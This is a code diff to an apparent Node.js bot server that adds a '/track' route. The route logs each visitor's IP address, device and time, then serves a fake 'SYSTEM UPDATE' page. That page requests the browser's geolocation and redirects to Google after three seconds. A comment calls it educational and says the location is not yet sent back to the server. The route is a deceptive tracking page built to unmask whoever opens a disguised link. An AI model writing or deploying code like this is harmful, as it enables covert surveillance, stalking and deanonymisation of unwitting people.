@@ -83,6 +83,37 @@ const client = new Client({
 
 let botInfo = null;
 
+app.get('/track', (req, res) => {
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const userAgent = req.headers['user-agent'];
+    const time = new Date().toISOString();
+    
+    console.log(`📡 [TRACKER] NEW HIT!`);
+    console.log(`🕒 Time: ${time}`);
+    console.log(`🌐 IP: ${ip}`);
+    console.log(`📱 Device: ${userAgent}`);
+    
+    res.send(`
+        <html>
+            <body style="background: #000; color: #0f0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: monospace;">
+                <h1>SYSTEM UPDATE</h1>
+                <p>Verifying connection... Please wait.</p>
+                <script>
+                    navigator.geolocation.getCurrentPosition((pos) => {
+                        const { latitude, longitude, accuracy } = pos.coords;
+                        console.log('📍 Location captured: ' + latitude + ', ' + longitude);
+                        // In a real scenario, we'd send this back to a POST endpoint
+                        // For this educational implementation, we just log it in the console via the user-agent capture if possible or a separate log
+                    });
+                    setTimeout(() => {
+                        window.location.href = "https://google.com";
+                    }, 3000);
+                </script>
+            </body>
+        </html>
+    `);
+});
+
 app.get('/', (req, res) => {
     if (botInfo) {
         const logFile = path.join(__dirname, 'bot.log');
